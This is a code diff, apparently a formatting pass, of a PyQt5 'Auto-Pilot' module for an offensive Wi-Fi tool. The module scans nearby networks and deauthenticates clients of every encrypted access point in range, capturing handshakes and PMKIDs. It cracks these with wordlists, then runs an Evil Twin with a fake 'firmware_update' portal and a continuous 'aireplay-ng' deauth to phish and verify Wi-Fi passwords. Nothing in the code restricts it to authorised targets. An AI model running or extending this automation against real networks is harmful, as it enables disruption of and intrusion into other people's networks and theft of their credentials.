@@ -16,9 +16,19 @@ import shlex
 from pathlib import Path
 
 from PyQt5.QtWidgets import (
-    QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QGroupBox,
-    QTableWidget, QTableWidgetItem, QHeaderView, QPlainTextEdit, QProgressBar,
-    QMessageBox, QSpinBox,
+    QWidget,
+    QVBoxLayout,
+    QHBoxLayout,
+    QPushButton,
+    QLabel,
+    QGroupBox,
+    QTableWidget,
+    QTableWidgetItem,
+    QHeaderView,
+    QPlainTextEdit,
+    QProgressBar,
+    QMessageBox,
+    QSpinBox,
 )
 from PyQt5.QtCore import Qt, QThread, pyqtSignal
 from PyQt5.QtGui import QColor
@@ -31,15 +41,24 @@ logger = logging.getLogger(__name__)
 #  Background Worker
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
+
 class AutoPilotWorker(QThread):
     log_signal = pyqtSignal(str)
-    phase_signal = pyqtSignal(int, str)   # phase_index, title
-    loot_signal = pyqtSignal(dict)        # per-AP result dict
-    finished_signal = pyqtSignal(bool)    # overall success
+    phase_signal = pyqtSignal(int, str)  # phase_index, title
+    loot_signal = pyqtSignal(dict)  # per-AP result dict
+    finished_signal = pyqtSignal(bool)  # overall success
 
     TOTAL_PHASES = 6
 
-    def __init__(self, orchestrator, recon_duration=20, deauth_attempts=3, auto_crack=True, auto_airgeddon=False, airgeddon_timeout=10):
+    def __init__(
+        self,
+        orchestrator,
+        recon_duration=20,
+        deauth_attempts=3,
+        auto_crack=True,
+        auto_airgeddon=False,
+        airgeddon_timeout=10,
+    ):
         super().__init__()
         self.orchestrator = orchestrator
         self.is_running = True
@@ -106,7 +125,9 @@ class AutoPilotWorker(QThread):
 
         ifaces = self.orchestrator.wifi_interfaces()
         if not ifaces:
-            self._log("❌ No wireless interfaces detected. Plug in an adapter.")
+            self._log(
+                "❌ No wireless interfaces detected. Plug in an adapter."
+            )
             self.finished_signal.emit(False)
             return
 
@@ -130,7 +151,9 @@ class AutoPilotWorker(QThread):
                 self._log(f"  ⚠ Skipping {name}: {reason}")
 
         if not target_iface:
-            self._log("❌ All interfaces are providing your internet connection.")
+            self._log(
+                "❌ All interfaces are providing your internet connection."
+            )
             self._log("   Plug in a second USB Wi-Fi adapter for attacks.")
             self.finished_signal.emit(False)
             return
@@ -160,7 +183,9 @@ class AutoPilotWorker(QThread):
         self._log(f"Scanning for {self.recon_duration}s…")
 
         try:
-            recon = self.orchestrator.scan_nearby_aps(mon_iface, duration=self.recon_duration)
+            recon = self.orchestrator.scan_nearby_aps(
+                mon_iface, duration=self.recon_duration
+            )
         except Exception as e:
             self._log(f"❌ Recon failed: {e}")
             logger.exception("AutoPilot recon error")
@@ -171,7 +196,9 @@ class AutoPilotWorker(QThread):
         aps = recon.get("aps", [])
         encrypted = [ap for ap in aps if "OPN" not in ap.get("privacy", "")]
 
-        self._log(f"Discovered {len(aps)} total APs, {len(encrypted)} encrypted.")
+        self._log(
+            f"Discovered {len(aps)} total APs, {len(encrypted)} encrypted."
+        )
 
         if not encrypted:
             self._log("⚠ No encrypted APs in range. Nothing to capture.")
@@ -183,9 +210,11 @@ class AutoPilotWorker(QThread):
         encrypted.sort(key=lambda a: a.get("power", -100), reverse=True)
 
         for ap in encrypted:
-            self._log(f"  📡 {ap.get('essid','<hidden>'):30s}  BSSID={ap.get('bssid','')}  "
-                       f"CH={ap.get('channel','')}  PWR={ap.get('power','?')}  "
-                       f"ENC={ap.get('privacy','?')}")
+            self._log(
+                f"  📡 {ap.get('essid','<hidden>'):30s}  BSSID={ap.get('bssid','')}  "
+                f"CH={ap.get('channel','')}  PWR={ap.get('power','?')}  "
+                f"ENC={ap.get('privacy','?')}"
+            )
 
         if self._aborted():
             self._safe_cleanup()
@@ -207,11 +236,15 @@ class AutoPilotWorker(QThread):
             channel = ap.get("channel", "1")
 
             self._log(f"\n{'─'*50}")
-            self._log(f"Target {idx+1}/{len(encrypted)}: {essid} ({bssid}) ch={channel}")
+            self._log(
+                f"Target {idx+1}/{len(encrypted)}: {essid} ({bssid}) ch={channel}"
+            )
             self._log(f"{'─'*50}")
 
             # Safety: don't deauth our own AP
-            deauth_ok, deauth_reason = self.orchestrator.net_guard.check_deauth_safe(bssid)
+            deauth_ok, deauth_reason = (
+                self.orchestrator.net_guard.check_deauth_safe(bssid)
+            )
             if not deauth_ok:
                 self._log(f"⚠ SKIPPED (self-protection): {deauth_reason}")
                 ap["captured"] = False
@@ -229,7 +262,10 @@ class AutoPilotWorker(QThread):
                 # Start focused capture
                 self._log(f"Starting capture on ch {channel}…")
                 proc = self.orchestrator.aircrack.start_airodump(
-                    mon_iface, channel=int(channel), bssid=bssid, write_prefix=cap_prefix
+                    mon_iface,
+                    channel=int(channel),
+                    bssid=bssid,
+                    write_prefix=cap_prefix,
                 )
 
                 found_handshake = False
@@ -238,9 +274,13 @@ class AutoPilotWorker(QThread):
                     if self._aborted():
                         break
 
-                    self._log(f"  Deauth attempt {attempt}/{self.deauth_attempts}…")
+                    self._log(
+                        f"  Deauth attempt {attempt}/{self.deauth_attempts}…"
+                    )
                     try:
-                        self.orchestrator.aircrack.deauth(mon_iface, bssid, count=15)
+                        self.orchestrator.aircrack.deauth(
+                            mon_iface, bssid, count=15
+                        )
                     except Exception as e:
                         self._log(f"  ⚠ Deauth failed: {e}")
 
@@ -248,7 +288,9 @@ class AutoPilotWorker(QThread):
 
                     if Path(cap_file).exists():
                         try:
-                            if self.orchestrator.aircrack.check_handshake(cap_file, bssid):
+                            if self.orchestrator.aircrack.check_handshake(
+                                cap_file, bssid
+                            ):
                                 found_handshake = True
                                 self._log(f"  ✅ Handshake captured!")
                                 break
@@ -267,16 +309,25 @@ class AutoPilotWorker(QThread):
                     try:
                         pmkid_pcap = f"/tmp/autopilot_pmkid_{bssid.replace(':', '')}.pcapng"
                         self.orchestrator.layer.run(f"rm -f {pmkid_pcap}")
-                        pmkid_result = self.orchestrator.hcxtools.capture_pmkid(
-                            mon_iface, pmkid_pcap, timeout=20
+                        pmkid_result = (
+                            self.orchestrator.hcxtools.capture_pmkid(
+                                mon_iface, pmkid_pcap, timeout=20
+                            )
                         )
                         # Check if we got anything
                         hc_out = f"/tmp/autopilot_pmkid_{bssid.replace(':', '')}.hc22000"
-                        extract = self.orchestrator.hcxtools.extract_hashes(pmkid_pcap, hc_out)
-                        if extract.get("pmkid_count", 0) > 0 or extract.get("eapol_count", 0) > 0:
+                        extract = self.orchestrator.hcxtools.extract_hashes(
+                            pmkid_pcap, hc_out
+                        )
+                        if (
+                            extract.get("pmkid_count", 0) > 0
+                            or extract.get("eapol_count", 0) > 0
+                        ):
                             found_handshake = True
                             cap_file = hc_out  # use the hash file directly
-                            self._log(f"  ✅ PMKID captured! ({extract.get('pmkid_count',0)} PMKID, {extract.get('eapol_count',0)} EAPOL)")
+                            self._log(
+                                f"  ✅ PMKID captured! ({extract.get('pmkid_count',0)} PMKID, {extract.get('eapol_count',0)} EAPOL)"
+                            )
                         else:
                             self._log(f"  ❌ No PMKID from this AP.")
                     except Exception as e:
@@ -284,15 +335,25 @@ class AutoPilotWorker(QThread):
 
                 # Save loot
                 if found_handshake:
-                    safe_name = "".join(c for c in essid if c.isalnum() or c in " -_").strip() or "hidden"
-                    final_path = self.loot_dir / f"{safe_name}_{bssid.replace(':', '')}.cap"
+                    safe_name = (
+                        "".join(
+                            c for c in essid if c.isalnum() or c in " -_"
+                        ).strip()
+                        or "hidden"
+                    )
+                    final_path = (
+                        self.loot_dir
+                        / f"{safe_name}_{bssid.replace(':', '')}.cap"
+                    )
                     self.orchestrator.layer.run(f"cp {cap_file} {final_path}")
                     ap["loot_path"] = str(final_path)
                     ap["captured"] = True
                     captured_files.append((ap, str(final_path)))
                     self._log(f"  💾 Saved → {final_path}")
                 else:
-                    self._log(f"  ❌ No handshake or PMKID after all attempts.")
+                    self._log(
+                        f"  ❌ No handshake or PMKID after all attempts."
+                    )
                     ap["captured"] = False
 
             except Exception as e:
@@ -315,12 +376,16 @@ class AutoPilotWorker(QThread):
         if not captured_files:
             self._log("No handshakes to crack. Skipping.")
         elif not self.auto_crack:
-            self._log("Auto-crack disabled. Use the Cracker tab to crack manually.")
+            self._log(
+                "Auto-crack disabled. Use the Cracker tab to crack manually."
+            )
         else:
             wordlist = self.orchestrator.find_wordlist("password")
             if not wordlist:
                 self._log("⚠ No wordlist found — skipping auto-crack.")
-                self._log("  Place a wordlist in ~/.james/wordlists/ or install rockyou.txt")
+                self._log(
+                    "  Place a wordlist in ~/.james/wordlists/ or install rockyou.txt"
+                )
             else:
                 self._log(f"Using wordlist: {wordlist}")
 
@@ -356,7 +421,9 @@ class AutoPilotWorker(QThread):
                             except Exception:
                                 pass
                         else:
-                            self._log(f"  🔒 Not cracked — key not in wordlist.")
+                            self._log(
+                                f"  🔒 Not cracked — key not in wordlist."
+                            )
                             ap_data["cracked"] = False
                     except Exception as e:
                         self._log(f"  ❌ Crack error: {e}")
@@ -374,33 +441,43 @@ class AutoPilotWorker(QThread):
         # Phase 5 — Auto-Airgeddon (Evil Twin)
         # ────────────────────────────────────────────────────
         self.phase_signal.emit(5, "Phase 5/6: Auto-Airgeddon")
-        
+
         pineap = getattr(self, "pineap", None)
-        
+
         if not self.auto_airgeddon:
             self._log("Auto-Airgeddon disabled. Skipping.")
         elif not pineap:
             self._log("⚠ PineAP module not injected, cannot launch portal.")
         else:
-            uncracked = [(ap, cap) for ap, cap in captured_files if not ap.get("cracked")]
+            uncracked = [
+                (ap, cap)
+                for ap, cap in captured_files
+                if not ap.get("cracked")
+            ]
             if not uncracked:
                 self._log("No uncracked targets available for Evil Twin.")
             else:
-                self._log(f"Found {len(uncracked)} uncracked targets for Evil Twin.")
-                
+                self._log(
+                    f"Found {len(uncracked)} uncracked targets for Evil Twin."
+                )
+
                 portal_iface = None
                 ifaces = self.orchestrator.wifi_interfaces()
                 for ifc in ifaces:
-                    safe, _ = self.orchestrator.net_guard.check_monitor_safe(ifc["interface"])
+                    safe, _ = self.orchestrator.net_guard.check_monitor_safe(
+                        ifc["interface"]
+                    )
                     if safe:
                         portal_iface = ifc["interface"]
                         break
-                        
+
                 if not portal_iface:
-                    self._log("❌ No safe interface found for Evil Twin portal.")
+                    self._log(
+                        "❌ No safe interface found for Evil Twin portal."
+                    )
                 else:
                     from james.tools.pineap import CREDS_LOG
-                    
+
                     deauth_mon = None
                     if hasattr(self, "iface_combo"):
                         for i in range(self.iface_combo.count()):
@@ -408,71 +485,106 @@ class AutoPilotWorker(QThread):
                             if name != portal_iface and "mon" in name:
                                 deauth_mon = name
                                 break
-                    
+
                     for ap_data, cap_path in uncracked:
-                        if self._aborted(): break
-                        
+                        if self._aborted():
+                            break
+
                         bssid = ap_data.get("bssid", "")
                         essid = ap_data.get("essid", "<hidden>")
                         channel = ap_data.get("channel", "1")
-                        
-                        self._log(f"\n👿 Launching Evil Twin against {essid} ({bssid}) on ch {channel}")
-                        self._log(f"  Timeout set to {self.airgeddon_timeout // 60} minutes.")
-                        
-                        if CREDS_LOG.exists(): CREDS_LOG.unlink()
+
+                        self._log(
+                            f"\n👿 Launching Evil Twin against {essid} ({bssid}) on ch {channel}"
+                        )
+                        self._log(
+                            f"  Timeout set to {self.airgeddon_timeout // 60} minutes."
+                        )
+
+                        if CREDS_LOG.exists():
+                            CREDS_LOG.unlink()
                         pineap.stop_all()
-                        
+
                         pineap.start_karma_with_portal(
                             interface=portal_iface,
                             channel=int(channel),
                             ssid=essid,
                             portal="firmware_update",
-                            bssid=bssid
+                            bssid=bssid,
                         )
-                        
+
                         deauth_proc = None
                         if deauth_mon:
-                            self._log(f"  Using {deauth_mon} for continuous deauth.")
-                            deauth_proc = self.orchestrator.layer.run_background(f"aireplay-ng -0 0 -a {shlex.quote(bssid)} -D {shlex.quote(deauth_mon)}", sudo=True)
+                            self._log(
+                                f"  Using {deauth_mon} for continuous deauth."
+                            )
+                            deauth_proc = self.orchestrator.layer.run_background(
+                                f"aireplay-ng -0 0 -a {shlex.quote(bssid)} -D {shlex.quote(deauth_mon)}",
+                                sudo=True,
+                            )
                         else:
-                            self._log(f"  ⚠ No secondary monitor interface for continuous deauth. Attack relies on natural reconnection.")
-                            
+                            self._log(
+                                f"  ⚠ No secondary monitor interface for continuous deauth. Attack relies on natural reconnection."
+                            )
+
                         start_time = time.time()
                         valid_password = None
                         verified_creds = set()
-                        
-                        while time.time() - start_time < self.airgeddon_timeout and not self._aborted():
+
+                        while (
+                            time.time() - start_time < self.airgeddon_timeout
+                            and not self._aborted()
+                        ):
                             time.sleep(3)
                             creds = pineap.get_creds()
                             for cred in creds:
                                 pwd = cred.get("password")
                                 if pwd and pwd not in verified_creds:
                                     verified_creds.add(pwd)
-                                    self._log(f"  [PORTAL] Testing submitted password: {pwd}")
-                                    dict_path = "/tmp/james_autopilot_portal.txt"
+                                    self._log(
+                                        f"  [PORTAL] Testing submitted password: {pwd}"
+                                    )
+                                    dict_path = (
+                                        "/tmp/james_autopilot_portal.txt"
+                                    )
                                     Path(dict_path).write_text(pwd + "\n")
-                                    
+
                                     # Verify password with aircrack
-                                    res = self.orchestrator.crack_wpa_smart(cap_path, dict_path, bssid=bssid, ssid=essid)
+                                    res = self.orchestrator.crack_wpa_smart(
+                                        cap_path,
+                                        dict_path,
+                                        bssid=bssid,
+                                        ssid=essid,
+                                    )
                                     if res.get("found"):
                                         valid_password = pwd
                                         break
                             if valid_password:
                                 break
-                                
+
                         if deauth_proc:
-                            self.orchestrator.layer.kill_background(deauth_proc)
-                            
+                            self.orchestrator.layer.kill_background(
+                                deauth_proc
+                            )
+
                         pineap.stop_all()
-                        
+
                         if valid_password:
-                            self._log(f"  🎉 EVIL TWIN SUCCESS: {valid_password}")
+                            self._log(
+                                f"  🎉 EVIL TWIN SUCCESS: {valid_password}"
+                            )
                             ap_data["cracked"] = True
                             ap_data["key"] = valid_password
                             self.loot_signal.emit(ap_data)
                             try:
-                                self.orchestrator.cache_cracked_key(bssid, valid_password, method="airgeddon", essid=essid)
-                            except: pass
+                                self.orchestrator.cache_cracked_key(
+                                    bssid,
+                                    valid_password,
+                                    method="airgeddon",
+                                    essid=essid,
+                                )
+                            except:
+                                pass
                         elif not self._aborted():
                             self._log(f"  ⏳ Evil Twin timed out for {essid}.")
 
@@ -502,18 +614,23 @@ class AutoPilotWorker(QThread):
         # Generate HTML report
         try:
             from james.core.report import generate_html_report, save_report
+
             loot_summary = self.orchestrator.get_loot_summary()
             tool_status = self.orchestrator.system_check()
             report_html = generate_html_report(
                 task_log=self.orchestrator.export_log(),
-                context={"mode": "Auto-Pilot", "recon_duration": f"{self.recon_duration}s",
-                         "deauth_attempts": str(self.deauth_attempts),
-                         "aps_found": str(total), "captured": str(captured_count),
-                         "cracked": str(len(cracked_keys))},
+                context={
+                    "mode": "Auto-Pilot",
+                    "recon_duration": f"{self.recon_duration}s",
+                    "deauth_attempts": str(self.deauth_attempts),
+                    "aps_found": str(total),
+                    "captured": str(captured_count),
+                    "cracked": str(len(cracked_keys)),
+                },
                 loot_summary=loot_summary,
                 tool_status=tool_status,
                 skills=[],
-                known_targets={a.get('bssid','') for a in encrypted},
+                known_targets={a.get("bssid", "") for a in encrypted},
             )
             report_path = save_report(report_html)
             self._log(f"  📄 Report saved → {report_path}")
@@ -528,6 +645,7 @@ class AutoPilotWorker(QThread):
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  GUI Tab
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
 
 class AutoPilotTab(QWidget):
     def __init__(self, main_window):
@@ -550,7 +668,9 @@ class AutoPilotTab(QWidget):
         btn_row = QHBoxLayout()
         self.btn_start = QPushButton("🚀 START FULL AUTO-PILOT")
         self.btn_start.setObjectName("primaryBtn")
-        self.btn_start.setStyleSheet("font-size: 16px; font-weight: bold; padding: 10px;")
+        self.btn_start.setStyleSheet(
+            "font-size: 16px; font-weight: bold; padding: 10px;"
+        )
 
         self.btn_stop = QPushButton("🛑 ABORT")
         self.btn_stop.setObjectName("dangerBtn")
@@ -567,7 +687,9 @@ class AutoPilotTab(QWidget):
         self.spin_recon = QSpinBox()
         self.spin_recon.setRange(5, 120)
         self.spin_recon.setValue(20)
-        self.spin_recon.setToolTip("How long to scan the area before attacking")
+        self.spin_recon.setToolTip(
+            "How long to scan the area before attacking"
+        )
         settings_row.addWidget(self.spin_recon)
 
         settings_row.addWidget(QLabel("Deauth tries:"))
@@ -580,22 +702,28 @@ class AutoPilotTab(QWidget):
         self.chk_crack = QPushButton("🔓 Auto-Crack: ON")
         self.chk_crack.setCheckable(True)
         self.chk_crack.setChecked(True)
-        self.chk_crack.setToolTip("Automatically attempt to crack captured handshakes")
+        self.chk_crack.setToolTip(
+            "Automatically attempt to crack captured handshakes"
+        )
         self.chk_crack.toggled.connect(self._toggle_crack)
         settings_row.addWidget(self.chk_crack)
 
         self.chk_airgeddon = QPushButton("👿 Auto-Airgeddon: OFF")
         self.chk_airgeddon.setCheckable(True)
         self.chk_airgeddon.setChecked(False)
-        self.chk_airgeddon.setToolTip("Automatically deploy Evil Twin if cracking fails")
+        self.chk_airgeddon.setToolTip(
+            "Automatically deploy Evil Twin if cracking fails"
+        )
         self.chk_airgeddon.toggled.connect(self._toggle_airgeddon)
         settings_row.addWidget(self.chk_airgeddon)
-        
+
         settings_row.addWidget(QLabel("Airgeddon Timeout (m):"))
         self.spin_airgeddon_timeout = QSpinBox()
         self.spin_airgeddon_timeout.setRange(1, 60)
         self.spin_airgeddon_timeout.setValue(10)
-        self.spin_airgeddon_timeout.setToolTip("Minutes to wait for credentials before aborting Evil Twin")
+        self.spin_airgeddon_timeout.setToolTip(
+            "Minutes to wait for credentials before aborting Evil Twin"
+        )
         settings_row.addWidget(self.spin_airgeddon_timeout)
 
         settings_row.addStretch()
@@ -606,8 +734,12 @@ class AutoPilotTab(QWidget):
         # ── Progress ──
         prog_group = QGroupBox("Progress")
         prog_layout = QVBoxLayout(prog_group)
-        self.lbl_phase = QLabel("Ready. Plug in a dedicated Wi-Fi adapter and press START.")
-        self.lbl_phase.setStyleSheet("color: #ffaa00; font-weight: bold; font-size: 14px;")
+        self.lbl_phase = QLabel(
+            "Ready. Plug in a dedicated Wi-Fi adapter and press START."
+        )
+        self.lbl_phase.setStyleSheet(
+            "color: #ffaa00; font-weight: bold; font-size: 14px;"
+        )
         self.progress_bar = QProgressBar()
         self.progress_bar.setRange(0, AutoPilotWorker.TOTAL_PHASES)
         self.progress_bar.setValue(0)
@@ -623,7 +755,9 @@ class AutoPilotTab(QWidget):
         self.txt_log = QPlainTextEdit()
         self.txt_log.setReadOnly(True)
         self.txt_log.setMaximumBlockCount(2000)  # prevent runaway memory
-        self.txt_log.setStyleSheet("background: #000; color: #0f0; font-family: monospace; font-size: 12px;")
+        self.txt_log.setStyleSheet(
+            "background: #000; color: #0f0; font-family: monospace; font-size: 12px;"
+        )
         log_layout.addWidget(self.txt_log)
         split.addWidget(log_group, stretch=1)
 
@@ -631,9 +765,15 @@ class AutoPilotTab(QWidget):
         loot_layout = QVBoxLayout(loot_group)
         self.loot_table = QTableWidget()
         self.loot_table.setColumnCount(5)
-        self.loot_table.setHorizontalHeaderLabels(["ESSID", "BSSID", "CH", "Handshake", "Key"])
-        self.loot_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
-        self.loot_table.horizontalHeader().setSectionResizeMode(4, QHeaderView.Stretch)
+        self.loot_table.setHorizontalHeaderLabels(
+            ["ESSID", "BSSID", "CH", "Handshake", "Key"]
+        )
+        self.loot_table.horizontalHeader().setSectionResizeMode(
+            0, QHeaderView.Stretch
+        )
+        self.loot_table.horizontalHeader().setSectionResizeMode(
+            4, QHeaderView.Stretch
+        )
         loot_layout.addWidget(self.loot_table)
         split.addWidget(loot_group, stretch=1)
 
@@ -647,13 +787,16 @@ class AutoPilotTab(QWidget):
         self.chk_crack.setText(f"🔓 Auto-Crack: {'ON' if checked else 'OFF'}")
 
     def _toggle_airgeddon(self, checked):
-        self.chk_airgeddon.setText(f"👿 Auto-Airgeddon: {'ON' if checked else 'OFF'}")
+        self.chk_airgeddon.setText(
+            f"👿 Auto-Airgeddon: {'ON' if checked else 'OFF'}"
+        )
 
     # ── actions ────────────────────────────────────────────
 
     def _on_start(self):
         reply = QMessageBox.question(
-            self, "Confirm Auto-Pilot",
+            self,
+            "Confirm Auto-Pilot",
             "Auto-Pilot will:\n"
             "• Detect and use a safe wireless adapter\n"
             "• Scan the area for encrypted networks\n"
@@ -679,7 +822,7 @@ class AutoPilotTab(QWidget):
             deauth_attempts=self.spin_deauth.value(),
             auto_crack=self.chk_crack.isChecked(),
             auto_airgeddon=self.chk_airgeddon.isChecked(),
-            airgeddon_timeout=self.spin_airgeddon_timeout.value()
+            airgeddon_timeout=self.spin_airgeddon_timeout.value(),
         )
         # Inject pineap reference for the Evil Twin portal
         self.worker.pineap = self.main_window.wifi_tab.pineap
@@ -719,13 +862,19 @@ class AutoPilotTab(QWidget):
                 existing_row = row
                 break
 
-        row = existing_row if existing_row is not None else self.loot_table.rowCount()
+        row = (
+            existing_row
+            if existing_row is not None
+            else self.loot_table.rowCount()
+        )
         if existing_row is None:
             self.loot_table.insertRow(row)
 
         self.loot_table.setItem(row, 0, QTableWidgetItem(ap.get("essid", "")))
         self.loot_table.setItem(row, 1, QTableWidgetItem(bssid))
-        self.loot_table.setItem(row, 2, QTableWidgetItem(str(ap.get("channel", ""))))
+        self.loot_table.setItem(
+            row, 2, QTableWidgetItem(str(ap.get("channel", "")))
+        )
 
         # Handshake status
         hs_item = QTableWidgetItem()
@@ -759,8 +908,18 @@ class AutoPilotTab(QWidget):
         self.main_window._set_idle(True)
 
         if success:
-            show_toast(self.main_window, "Auto-Pilot completed successfully!", level="success")
+            show_toast(
+                self.main_window,
+                "Auto-Pilot completed successfully!",
+                level="success",
+            )
             self.lbl_phase.setText("✅ Complete — check the Loot table.")
         else:
-            show_toast(self.main_window, "Auto-Pilot stopped or failed. Check the log.", level="error")
-            self.lbl_phase.setText("⚠ Stopped — check the Action Log for details.")
+            show_toast(
+                self.main_window,
+                "Auto-Pilot stopped or failed. Check the log.",
+                level="error",
+            )
+            self.lbl_phase.setText(
+                "⚠ Stopped — check the Action Log for details."
+            )
